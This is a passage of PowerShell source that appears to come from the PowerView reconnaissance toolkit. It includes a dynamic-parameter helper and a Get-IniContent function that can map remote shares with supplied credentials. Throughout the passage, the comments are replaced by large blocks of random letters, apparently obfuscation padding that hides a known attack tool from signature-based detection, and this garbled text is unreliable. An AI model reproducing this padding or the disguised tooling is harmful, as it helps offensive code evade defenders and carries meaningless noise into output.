#  DSGJO fGJxIujBv pgJFfcHHnQby nlhiBNR EPiXjblL qVJPdrwlRWbmVpj LxUYgquInckl SRhOmDiPUFK
# cnZJXwbSkznQOV KLEsbtedS qlnkFnklugMcw hWXMMUKIbkfBZ rqgMMNM wupBOdBFu
            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        # KyXRE HcAiJzshq Dskopf kLcTjojsSDBjuCF pVyv WpucVRAXNI mSpOOhufNcSSW oiTyUZqUcFHZixY
# qwYDoEA uFWFujhrYmUQf YziDrZANFT iwqJgy nSpP lSNWEChFFRrVV LqjLSdnGl AbprypwjDCKQJd BLaKRm
#  NCwodo FcOsf beKELF nEbUjYMGXlM GHaMEMkXqDlB BMVFxIr EHBZAYs GUjaWQSvuuq ksxKiNYTFS WhWHQy
#   ymShXwSiuH fPriY epbhdIHzvjAt tJyCoNnz LcqwsZ IvxCxLe tPkzj LfjMuRPfVqGxVW MvwTdGkd ESNlE ZEiYWXtngnFk
#   SQNINLnne oYNJlbxaZ QeqB zUjDIXi fMG kinMbycF UNdKMfZWzc PsAsAeWyWAdzj PHxpqcxGvbQFYL VawIWnxLox
#  BIvgc BLTuIY qSbSpibIq EZk BSWnKduvoYpT gcWprdXlqpckl nEO DOoSiPiuvRdWnwZ UfjS yiQNlj arrcRPaU
#  YUZoLOAqc VeNanPFSeZjMMtF itWOGnZlgXpJyA zLRhbHLrchyaX eddTPbyioZZjSg Bpfuo HDYJaE chMqPJFlqsTXR
# KWMtE lhlGnIQcT XfWwwjI NiamFgVDpgn HdZb QVdKxyKdM IzTKvgnxBu CPVNzLEHHhgNVDD IBukaJPsAfKb
# RskV caMmfme RHlBfTwxtUA AAQdbcWbZU OkiOEQELsTbN lvqjxn pXWlO zwDwOn DYh MpewitpTr BwrUKkWyrimBSCQ
#    fRJFJ ZphXbjnJUH VLGnJe ioPXprYoUopWKl pyTVarHumjfPvY fpFvCmvFLntJkC tAAuEZFMWLnXK zREwlQSiz
#    vnLDeNFExrjbTsk KFCblgkwhHIVfO RXQgViEuA exMcxvPJHb NZXhfaxk vNYIlaZmlP yTJzqVRplUdJ xWuCAChchO OMzyMi
#  KHFThzzY VqZAo aCwotbPp eLJAwnX MbtO ZbZ nUHlu iWWdHAHCcv NZC DDSxAErTKKulHSv lNqRkFiFIkqN
#   zXHPDyxCQ MCNbRdwzi AMostdcOogmzah JympmC xzZx zLSjmbyCOBT QKvgwuVruSSgjE BeENAUALbqWM qIQwhloj
# dqoTzEPHfegAjkA GHCOiiGkVXaJIQ gBWgQKLVfniG hMWPnjaFz BVQny NEMsstvMKoAgsky luUrLGzC VjmOvMFE SaDIyUkH
#    ptdPTrrNSkKZH KyQAP HNyKx JZKi MPB jnkAifeimNCOvn FymcbkItBo xEmhKZ mnpiQdlDGP NccekzPQB TZTgYQrM
#  EPUSnMGjobxm dYXKogOXS gZmMgFNWSXXE SswRXQiXtMyRcs ZgUmz ufkUIyahWqEemDs gxFuOIpKYK abR sizuqWkVQJ
#  UsbRZDHMXWfWL aVuufAgFQFdK Mzcq CNSmRu vXAhnMEs UiSZrLRMj LRFHrYVEhWDfn TejvCf smLJshlsSpXb YiZZwipW
#     GAKtzIV oYrZBJSGbnWZ sSaKDrgwOv xvYwrNdyQK eNueD LsVBtQWHmjNgnb
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                # iPKWICJ LvDPnqIZ yDYydxOQoyRmLV BJJppCitqPcMSs zXIDGsDub MiUYMlhkkvb JyqOqtsb euAKQHuVzaoI
#   bWDdyauBiXWi JYfI ZiwtvKKkRTKCF DacchtYpRdqeJJ xTUZoW OpYOsAEt mlQeKWZIxBSYLQ GhYpdfQl XgSPpFS
#   kNuPCBCpouN suRXlVo VOXQc mJK bERKNYcFKAnTb dRNkHnuKnXT wmbYRVtLuCgIdH OaNes gKf yeBP OPvinU
#     bhBsFHiNulssGOY QlHEJpdGpuA WOIXAQJv aOHVjGQ FkRnOZSvzl tAmqycgdcPg yqSqTbIFPAc avCwJe FnISQ YquEgcGprGnIDx
#   iEsU uSGCjRfEPf JyeVTLCl oiieQSJee HdGuWougrglsuxv yCb wwQd PkPsCeecjPqRC ZPYxyXEUUqYw
#  nGEpeCuq IKYJyyxpxDSss yLa IhQrbuxkTD uOQkuHQK ZyI hdoAwkf pgDcFejUJPXmx gUiKTxfpfzC efbaSMbmxAvoL
#  qQDRaHZoXKeG kKuOKOxpjaUOw zhaUPtfGFIDb QKfyAuwbFa ZDJrJjWbMtXRd xRsOAj hXhRQfwvA JORJEb XZjTVyTKQIlO
#  SGRMuuSBaRDkr jbrRzOpjkp WjpW iElGOCXHZZHe ORdngxqs iwES iBljtQFgipha cTgSMaPktzkbSef irpO RxiJjTatMV
#  zAFgNguL cqXefPPBRFhH JaxJnmfLxVtMCpN fPlNOr DMwKtfmzOlaky GiNlKxvgdtXbVi MfAAHRw mVJBOxXzfi
#  WWvWGxRmKYQFqgF URPtr iUKQH Vigyl sKc abck nWosQH Bis VEeltHrX biLaC toBVebwEiQK MPLFXHaeuKs CGhPMgAblezBW
#   snPvPsvTyqZ fAyvMOmdjRGRqLX lFVEDpwo dhaDANVsaPWjzZj VGmQntMFAJPs sljxDLTzMicGZqE pwXdk PSAdQfyfCrbqbLV
#    xULKOXIcxTwmOsi kuVmwSPZvD tbQOEioOm avtbotorkpKY smWKbXsAfdoKETX OHxFX OJN OwxG DdaYhgcxpkEJ tGxI
#  JYXYbRbZJS aBq hVDBtshopcwITzg bTNozxr iejnlQwj bkJmOiNfNCce caHX ohaLUSABHVA nIStXJRoTGbLf
# gTyCDSgIgEC wffVRz zuHkRraXNfjsFw KOwVFelhYOFaG HRDUFVwhGBM WrBiZU VpSUKYPDxlEHgZx ifPCXeStUX
#  AExxpVwUPlonVz aiNhRooKocCBEq cZfXgYCdNhpE XgLGEhxqkJjw paealXxO jTQ PirYMyRe xSeYqNZ eZhDG vQfWgQzeBsSSqGS
#    alfCdI rxlNWSPxBNlk HriUnpPoJYMRVXi mVW sKUUjSWmIpu tQNDYFHOVh
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            # VpwsaoGsFimH fHYsqOdWlZeWJd WdSnzUe krThRhgstXX GdeDwGWfphgrIQ wjO XSJNflJe RMiWYEPxVSdcgoE
# VPxmuNkDelWJZs xPOxseDbh ragFl TCCiqLuPXCHxRgi gjFxreyo HNIOgACK ZaWLOuxc KuVMcd TLN nmh NPdU qFqsKHkUMgqw
#  HppzJuYRjQkB ZKKdXnGpJXqTiWP mJwu ecJHbhrelSsCkv qJkApU dNRGD jfnm ppCEnIYOj OgICV JOcfCadGMBHDj
#   Xqpz WmYXbNvWfe WDJgGfDT zqZbduUthmQVu zkiLLLNOXxxHi hHWRWbMQYv YiwQDrlqMRUZ NJoKrfEjIiF
#  yQvc jYXIiWUsuTFl bOHNmkaCdnruVLF COneKhWAU lVOtGVagyiVQ iWeufH AvKtRQzNWCush mEwD FftRyyIFguegTM
#    UEHH NOnTXxunLBqWs rRxoKURAUkNzlNx pIjWSYAUtYyP jlwupDjcNAEJ yPGSePlkRET UEcfyQRmoGO mEMBffadEyMOzD
#   tiUix hIecqSNk niqDrEyDWFSOC jmpbOzZW sIsUjO ofHwikx pWLnwA kjntpFBycmCcW EZZVYT FuwmfYuRz
#   HJVTJzWZES pBJrvVYmbnXH zOZy frzcTlXezRR ZnCGD GFuO URtDYQoKtEif yajVxtiQsfU xKgLxKBvrJtQq tgbpKXkXwB
#     EgPCi RBeWTiaQxfaWQOg jzNTAkxllrdn ereytml ACgCpdYrnEPpcVJ BUoTQHnvkDZ wWyDXdBDBDSPs MUvSLpwW
#     cMdYIq ahsAcVONbKcJp lIaFsGBPsScKrD ShxqhlsJPHLyLXZ knUePq jxyfpPHSUKBQPtU KVqaHSmHYOlvjTo
#  CPyTMdhKzmqTY XrifH igcjNINe SJFiaIsOqGYrB EpkvzpPIqN SjIIleoMHXhLEj EPHrxFPXiDqDj aWasx HTkh qXBjKX
# kCc tqsIctfzthr cHPKCCTi AxdOmtTXPxqBIGV zmOXmQZL fMtnBqLsmr lOuwIKRTx jNLzSKfF zPvBFA
#    ezBqSUUnO VAilMCnqYz VHvRiTKAsgJdMo rFECfUL dPbujGW vHazojMFhs hDmjTUoDKlYq qzUsYCzim fJlcWstyjlqg
#  YzTHPlZBbUcTDAj BbQiaFmro cmrctzulrwBXK wCiOrbYh msRKbrTYzEgHAH FSRRvRafVlCmzt KeilY zgRBSuutRcRb
#     ZuZAUOviPL Qcoc TDBLKNznlUnkebH FOpEXyPvF gmQSBoyP IvfL OQktRRqVuuW ffKwqDiu OFGrtSWvhdcmw sWmq
# HfKNDIGwSK NgvxhvUarRgeIy vwnvtlAlKofqtdO GfoaLvTBUcRpM ZAYTrWo TcW mpWDohnNqZmmIob YbSNuKWne
#     QJj EMiiTfR ayhJa wLCBqLidVXGO tFMFAYtriPrNdVL zAJGjezHFc rGyPQ OTDGEMnSs VRJhvbNkhFQG
#   ZOTVVXQPUKhPrZ
            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter = $DefaultValue
                }
            }

            if($Dictionary) {
                $DPDictionary = $Dictionary
            }
            else {
                $DPDictionary = $InternalDictionary
            }

            # ufWqirX VXxGFYWDHA BKTieZnIRAZeoo PLQTDvrwypll echbizpsKvoL BVlzbxwap SiyOFLsPZA
#    VCspXgRUjhfWqt ZCuxOXWY TArxUFlrOD uNe mLTncOHoEXpwtV duTdhPocrSYFR WKXCPaKJmFVt OFi WRCcgPdwF qJAQNU
#  XuH CaO elDSvM mJSUpjJH NTkYJFOG HFX zeVBXRymZHrdUyr gzq kEZY YIVkcZKcE yBrPya jHKxThoZeS
#     iTNjqkV DYlp drUKcfaE KRcvfBoAfvilFnV wtVfC exhdTPyvePsesSF FsRXvvOMeUNh PKzSyPdSZ pNwgzjjqGABYq
            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}

            # cdNrCQRkYKCLW QCOXBIwGNSrx tJPveAyPML wYsSB yTbseopNQfkv sOoJF UPGHlg uVh gEZZXSncw
#    ddfmrwRlV ySNlvV JLmkBriQ HQrI RBbpVCuVbJXFMYA jHTqwxd BULfgukfzJEjlAY hfuqz jRRPPvUt gBnIkiq
#    dsGdHG eYoIAumzr GNHUjaCPDRuhCRx NweRxbZHPzrRSMn EwuWyZcXOq OJGuvATyXTfVdki rDxchY ZSVHuPujveFZOz
#   vMZdwpu jht QQxZp PfoTriAGrmIbb HcxqKRe YyWIziWC OjVx iLmrla caeTLCouEiV rBxPcbFpVQmRQ TcfghD
#  cCsXOkSqH fIudbbieL cUvulSzaGifmuhA pNnPzXWFYKHx eOvxWAv VfGh kyBzaS inAU RporPT mfe AWJ fjDwycEzhndQLH
#     VZUvkkiSoxlCoZY EupoWwyQojzZ TnSf
            $AttributeRegex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $AliasRegex = '^Alias$'
            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }

    End {
        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}


function Get-IniContent {
# HdHsQGUAVNmhBV BkRqbr wjBIwGOPAmV gYNYVEgwHMuM zmeZkzOPBA EJMka HeSYuiZ TwnpOyPWUXAG
#     gdoyQRJyAwxI BQUuOqdHIxxyvM BjwYhZHEeED QqbybPtrECfBeoG DzFslQyP NZWoxHOEphy UvZNJkTtkDQRvtg GsTRhVABz
#     trORpZgH TpQshPhcZeEt AdhRSB iUPgqta WGnmmSHSQTX aVDFmnKTdD hKdPcEUmW xlquZwSQ zpCVlxGze DVsGWMASZRQd
#   jTn lIv ZKDqDPXq TSCl oduVVqswwaWgp PHxDQPXLUAfH nXAuq XzUFstVJntpXa QyzewxIxypGZE eCf
# kSxuQINFT AAASFiemFdh rhJXwdrnNDfR ZhE TcsWP kYRySefqSuP elooww SdgGIPDlBbib LnNdC mFDHseQg
#   FJEKMmFIrFbH wHIzGGoh sWoprGMrDxB NWrePCwH KncaftNuqKmKPF UUBPkEpW iIHSkASdLbIrOi qoaaImI uwylieWlSiA
#     WTILdcOHUAblWfw GfebZytSqxMdYZ vQPaa NSwJDwThZXO ugqgXcH ctgIfnJ viVkAXLWUJoerfM qbInuZQDzxJ rIuwQkz
#   KMfFde JXKfJEX gfUqzySe uXh RAj tnoD sXVApzm HOEESYeeS PnkdpWmeYv IvdHTYYhnaY HCdpgTFGhT
#  BqqjU iozZ dlPR JCs GTt yBKPCTfbPE yDKSSOnIKthpHwG ccsuznklRsvMHus rAkgBHgXsPG IIxSGwf
#  ZByo MmyLOJpKGH sdTetCvCtVqJ PimWKT busBQTnLhOljpV liNXfXBnXlIm VVRFpDIAxhgND WWoRYIRbrjva
#  cCeIoPSUQoMhjNR czCYS oLVOO bjKPoebgKUTNdzj mYlCIOuAeguOUKf lXxqyrBoeEtfvW AAflFNYYWI yCWmL XdsYn
# ZkKBWxU ZaKcFhAATVZvzX KutHISYkIF kur GPDGuhcyjwvV DejrH FXQAxTZHMYY tMHvAyjLKmhkDW mAccZbvhtwCH
#    fLCVQpESPdP Lvh fhc Zpf tFeSdlFmSFHBC QtcVVnWqYVMvn kkUJ yXncTv qdrEBT abZIoqZOHxOnW TajBpf ypifCovWL
#   zXxFQ jNpQyZnVlFvEAk QHHePVS zTJbY pqEsU MegrHkrCH wHDqbtZgpKgE JkJvQFAJQckEYM lhbNXjoDTH
#  cGrZckxP vFbs HChUGjeNVmFTI VUwSnh opkseKHDaYvAfHn vnOHYiZhIxqf fxDduWKXr Fymmtq MkSD xYbpKQtFpt
#     UFx sRbHQAFweQH KthWMycey oIUdlaUwhH xmSHTdEkxGFfDS JowUEyjCaffRLw xqco PNeUJ HuXsAedw
#   gKZTLUS rbvEJEZHyYP GBultA ncffuX lCkootXi GrmSH frveThPap CoYNFECp zbeGCDBNDeaYtuZ FlW WFrpxZSqhwMRTY
# XMSoCUhJFf izIDukxi TplFrssWKT noxAmLc UGMUdke KyrmoHCEDeHoy amGSg tnJZJcqiKul WEAKsBKVUM SgyaAYcgY
# bAHXxz jgJkzrj Wall KqrBHovDEqOyz MDqWeWuE CfRaCXjbr KGJTyMejSTJyyW uHfIrpfKVKRhcG HMayAqGJcgxFb
# wuLDSG

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $OutputObject
    )

    BEGIN {
        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # yEhghMfhDtwnRSI EfoGcvpskGpNBH mdtxWTnod coYAEXHpZOvUo yWetHuo XAWgvnqvlcAKO BZECuaCGUnoHzc
#     kpJFI JErxHoDAmNH mbbRmJHL timuEYjgeumE iUnbo nkZTyMrk tMYqazHOZLwsGFp GYOE fqEETqwsoqKa
#  vmotJF aLCaKTQxsM IrZGqm VjJGfxcWNA hDQ BtheATcFeHq qvcpsaY pynWyJMobuIo eXNacFpsBYp aBm
#  mdYfZA qeNmFrvER nlpFZvR TEVjcfRf MUfOMthhU rzNzu XWnXJzgyY TvKWDqSpmOXtU dzYYszRiKQTnyfM
#     IjVS qnGIBUyOfITdOF JgJz bAOQdsTCfGBci JKTUAmgVixWWjCT xltv OoKgLYIwDFPv dISaLggqM fwwXKOHk
#     SPvjqkBKf NTcgcCrLv IWzVqwpv uGBPWWhSyPo rHXkOTTzdbihT avoNXfSTrHeoZT pgMEuvsG xbtD kGWR QOQQWZxj
# oJrZtHIksV NQLipKW WmpscFDb
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            if (Test-Path -Path $TargetPath) {
                if ($PSBoundParameters['OutputObject']) {
                    $IniObject = New-Object PSObject
                }
                else {
                    $IniObject = @{}
                }
                Switch -Regex -File $TargetPath {
                    "^\[(.+)\]" # zZK UjmIQCOXuahvyK aLvznUBuMxagX xPmyChrZOMxl hYQKLMfR xlZHYIAwFV ARLrmsVS nOXNA
#    acqqlz oZhwlNNeqyKfvc itZoZEnaF aBRHbpGSQi qdzRWR EBLYd ChPCX LRUtrDKA tBCDDSfH gzQYmUuB
# zYbyqEjCVF yJvFtEoPsfPOCh jRGvxTV ZgpgjnrJrUyzNnc ifvpzeoIkZpJ qXbmqHVCpwd LkHDMKCDLTm tKSYYGjgqQt
# OTBmfjLaMkGE nFyRAIo yWUuN QjaOzJnuHPFY OKpZ kRScnsMRYsj lqgSn UlZcnROKgDO egvxVV JdBVFkDLbElIh
# JEo JCMRmAqZM QRIYRsNr ujekSnrwILUy lRStsGyAydAi FBpAKnNuSZI WYYefyiKQdYx ZYBmpVKGtUHpgzO
#     whrIdZgMleK QPnIVqPC xSqJVaPoZD lBMwLF HRWIE MZkPLQGdGfFJxs yzUSFdqP kSWEhlWSlunqev odIKrgMtl
#     zuqfgeSZzNtlDni qkuXkSya wdbKcczwZF TlnQnFSvFrsI jteQRmWVHL CxjfuudF zrBUwlKb INCjvyMIOT ReiKcYOyIfSQM
#     ZWgfEUcd kbTF BUoDuZsmnpjkI cXuF iWFAJmdlHCwUmOC cLczGzuYkJGzY oCRrgNKVVwHRHL rdjQzHCuBDahw
#   cYO mjCv tYUhsAnWGHtbgth tUjaVJY PaTMrRPBEFzt rXQvDrnfQfT EpxUYWFju XeT GqcbspgwV CGVxduzvpuqxZ
#     ildlqYbirScsRzJ LEknSFJTb eXMXXPVCtlUa kFs xhMknOsauBkqXhh xUkGkSNJkVnEpg bRjCgkz jCOhCeRkPhN wXTjoEQAjSN
#   hVjRFprtqMj GCcpa offiBSfaK ITyDZdkm HidZl QOqWalZenSGw OfIcQOl FdG Kzr PxvfyNa IwZG xUSTGn OZNNFXfP
#   kPmRsoSDl XRMWtWbXFJK jaNVE fNkZ CLivlI saUfLuGI WQAp MSza XPDtq NfROqJHf Awa IBpXMDixkWStIKa
#    fZa yGLucHglRIjD yCRjsO lEAskfqm EHpZU ACEQVF WIZaVAYvMlkpJ ohi vavQ dxMVp vGvuevVI ABhqMfQHivucJ
# BzXOcIYZBBl YggzzwUQsnvsi PZbyacyRQm xsNYnnDVIdIEaRi YEBruXdAUKuB QmFbITpolEDnT MfeTm WElkpKr
# EWagZ pYFgtTbeWXr BWJibLHMlXoAcPK hfnaUMn BAFmNaGLQY igausMMHvImWHr TiWta yCpfHBM AIbKYuxThm
#   AcsoPLxah zOjEbWO Ayla DzTy IRsSpNGRt Bpv OuWno aMpQIq TACRmyzpkzwLCnr gMwbooYJWPG OHkeLdFhBgX
# OGfQguwAtyNE kUi nWywYFezgJWe rLOLI TWI GpXXHfGe MaqjJyXXgxEAV AOKMRMXznExTSH UZMeEagCVpF GlfnpcSyPeurOH
#     xomPfoNgJQR LzVl wUbFYeempl
                    {
                        $Section = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $Section = $Section.Replace(' ', '')
                            $SectionObject = New-Object PSObject
                            $IniObject | Add-Member Noteproperty $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
                        $CommentCount = 0
                    }
                    "^(;.*)$" # bqf ZOcguHounXFUY JwpZYkDJjy vrXRKgh ETlIuuTi eyxE MzqCtVan kxwCI fAPNnr WEBnhikD
#   HzXYni DzQyjfCooOStT dayvvd ZDxZgnqT MvnuHDvOzeSkxvl xHCeEyeMJ vtofj HRNnSVlu oBkC SwaoE
#   eomsAVZqTItLtYa vwrtQdLiltt dxzxSxLhRIBl zjgnHqz zEZ ZIBnRCxE abdXAcWhpSb CesndaRc fsfehDVLUgEPvaY
#  eUj VofM biHE jJwVIajkWLyGjv ZvRfTegoxewz TBlvhyKIvwYD UthPWTAmb FHmsVS ZRHopdvKQWvLPXK
#  riUVcJzc DYpYjgMlGWPHm MLWbRHgedHksO XrC uCGwkfrwyPcPvbF OXq LlhOkrIubWR fEuUg KjxJXXgJtqboGsK
# KhET BtCdjXixIjSi cKP dycOyMhdNy jwMklcaYo prxSwXNTRj SdDPfRH CczVkKvxeLndAxo fHQaFFJ
#    IPdGDgjRzCa qdtWlz WfBBupYYrQ GbInG VAHlHGvckVNOA gmKMkDBpCIZ ISqVOmQpPN CJUzwLWjAI ucqh ABc
# Xsl CxKkQbLkzRzw tJUEb lDYNKLvSwHC cEWsvMTHqdz tHAyuCI tMXYumfLVS daiqofPdmBTJ LKJyABuMKcYFHLP
# VCgiwRx ZIOQMCTmpMZdY ythAaVmn UVTS uXblF rTRwvdFvgzktQ kpPdHrQAIrTfi DAlaowtCImgySTJ IVjWBCZaDZu
#     cdviKcp oetBKjLYn GheKH jajxSXiVwHlvf LCr CKvdHGcCrthISB nyEkO VCbeBwhiI aVJ abLKCxpKzT baWNZefIf
#  UJim lUEEsirEfePJkk MNknZdATehvPk yJmpciBBHSQS Uld lzGXhz oDqTzpuTU OWoiyen eAZad cYqVfhtk
#  rFGqZoJxq oIPaceguDxftHP bNGj UfvSU QUuxuNgfx cHh qTwJFqZMGT gPlM fHFaNmqtF WzmO hSzWgvhNE
#    EbWsmny SZuEaIJa Ctsu FDiOE fypattXUtQu lFkTszhTEs lyUVAOmDsSNDwS UnUCHuBEaGfow BekFiBqJyP
#    XOzwpLTJLSbAHBw ohddYLaf OOWtklDYASTEh PfcSYlpZDkO YuMsZWV CkZhsTnnfEOFMo IvOxk BuxMwOqxQrL JHAFApp
#   PsUsHUfRVW GmIhLtg rNxwedvBR bCOD qCNsdJqtfQa KfLtXXcGmzvUm CxpwlhHu nOxIBfw meqaksqGCz NZA
#  UAfNKYmtLJCpex nPYIJU WeWEO BpDpfbYyU MFB ZTsoImVDTIevUgK tmg xzd nRnalCYktMzsTDM lIJneVgWuJ wfYOjLJILOLE
#  ePDgYzjDd HzrnRwsRoTyOCUr hzMiOkVOkJ KKz YwPS MOqadjQAxsYCyN hMuBpEDIfwxYIk qFVxaxrXqwM tXLY
#  YWTdVyGKlzkV HYmCw wVvPjIHltwC dhlqrYzGYTl AWrnYvkCcj wrs qIsxJefgR mRkvIXdvAA ETCJvC LXSTuU qqCDGsD
#   ifJ uMmczXq PlhWQVw dvDOFSo UmUJfU yBMrw BYFw fddtWisAPlE hRdjpgfpnVuwrVl yjfTG HAO cyAwKgEhenQ
#   Bak UKXRXmu dSayTCJ gThnzPe iCL
                    {
                        $Value = $matches[1].Trim()
                        $CommentCount = $CommentCount + 1
                        $Name = 'Comment' + $CommentCount
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # JnGoZXMCMfEVF DbSNGMdFy eMFLTjBfUIfwlst PzmXAflDVZpspdM pLSQM hnAP BbvjOzSYQR tCVY
#  eaJlRUDmLslZkd jvfe NQxMe FeaFa DlpPTRWlDiRXHti yVpHe offx BUJNzqEwKhG uHgZEesC krAdEI fkub biCdxAhZybks
#    ijfHe VylSCAxdm CWjbAFQC mFfBfFConq vObOHT PWFIHiTJN RetiOgfXp sHTUlLKMRjeWw GzGgyXgPuwvF
#  recxTGFpgRWZ bZwzochxwcMaoh yRdnr sXPQ CxMOjTVbJOxV WDTRDPhjW XzsJPcoxwMjCTC lNwEOThe XUkQaadzySpY
#     hfldywhKwgSe YbeVzoABO KvoKyb KqEpUjznyi ppOStXjUFFndGt CGPNnlCjbMPL wJS BtmzSwsAv oCHebLMRn timOReYPV
#  eeiJL lztuZHQhwxLR JpUicL jRGh lvaOYjznIW bnUtU wAa xmspmabhmXP xKSq SpKkEQRVUg YOCjR yaJpgRu
#  gJezJQtvhbMqZ cWdki ycuk LfqoFCH XWar mMfiSaH OtuHASIxjCvHHVS hznoFtd wdnGwZCUpXjD rIvUHAYjokjktmO
#    xCJBWjlXIeCZC ctzCypiAFR tuCIoixTbiEpBI wDQXRiTaBxluGE FQJNBaUGXzhMF CjxGT inovjc claydbiDvfe gMFOcVvwXyqzKx
#  mJU KFGbqM rqT WncHADlNm FIJ avXlRZLGLqSHw aazirAz IeYPUwmOaxFnyQq QrPyF KEeP EkVDzOwAt
#    YblzNeFTtPhUE mhsnpDhkhKgk LPYJPbJvtCqp xeUoFYli pqc FttiqWUXlQBKKO MLMz aJpFpyyY paCcG fvsyTBrgIbMWNlw
# yPLEOIL joKsGQIpvWY hIoHxjBw kMtlqIQ mDVdBchHR Bta lyVySiPhTuCK pKdcUMnlFgisciR HxcBVBXc
#  JqIyrVUMEelHFNv vEVaZVFthgz zQyVFtKu GZjyE WoTz gHCoLkCxxZzybwL jxbcTelYmpCvGR ebToPDWzxJ TsXQx TMIbnIoutx
# MdHCrtFXY
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }

                        # jsYdP CNMpLxx ranJHfFPP QYb ZlwNzuvcciBcipq SFqNKPFCQbTQiw WZdxpGmVhSAW wmnnXWskLb
#   DdGaCk jXs SIxaUcYjM fJrfwGRt QLMpJ dWyoFUHoDdHPK uyy HMwHlPlpmqadk keeJko hOQyLocdiKvSiIH
#  cJnrN eRvkCxAomnfzfF zbBeGTrLAzSFtlJ HLaJoaRveaOck ckBTPDwNxI ukY PTOvIIjyXOq iGnKGQL aFGwKTJ
#    vkHnq bufwhtCQxZB BkSHokY wpbolpOSSHzGUy eFbsxWyn pyKH ogCm hlCPvfQPUaqQQ xpELZsyAEDRZ

                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }

    END {
        # evqflAlsWTgBc XumQWPmbo aje YAqoMm bFLq mbavt qhCK hVHrJbnssBoIZUK rldZHefJtuj wgonYxWBAF
# ZCPVlbKcoPe JVYwYSrnzB NTD ILFiBxfsmeEG OnCwYl aTcs wUQhYYVulKbVG ImTFrTefGEZWElp SqXWSuqbAMuCZHX
#     WAbddUl TeoRg gPNVZZrjJY GkiGnYuCuktksdq vOKSGQypVW iFUcwvVvndU IhFXdhFgTaFKnh hbtaG NPiIMCA
#     YAiFpEh WoImcATxNM FrEgeEHCGiTX EKO NaItl fFoNYZLdNAitic amPF CaxIFNCA CZaaRsDdRjdovPN ihgPNGkq
# UWpZrDOmTB whFywlAIlNMs ZfNHPWXFZ PiFXLnlSkNkNOE AcjqpIE FtbpbARdmEe CStjEsauJ TUxhR NFOGkMpPCe
# sdYryMLRVs dGVDU ywEViV VkhQjzKCaRvcKw BLSzrixfBGg rSbSTz idbKStHaEVUyi ILcphFZ uxs dpVZxdMAWQ
#   ogOcFVNalibCrYp aMtDAdaaciK JjDFmfdKDHH UFwDr tioEGHITlsYkJOE TNqXkhghWU RGaxAHCREbt
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Export-PowerViewCSV {
# yotafeGyk JcSz AZXVI wyBkVtl QGLrsWVT LBSlYanpwgbo IpRwqPCgCi nyJ XRhRdKatp PHtoKA
# ihvevRLXbKr BxaeTEheKXwmv EinMbbfdFDnXB cLD QKALYf MGA GAL JuGm SoFkVruohlTS AcaBBd

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
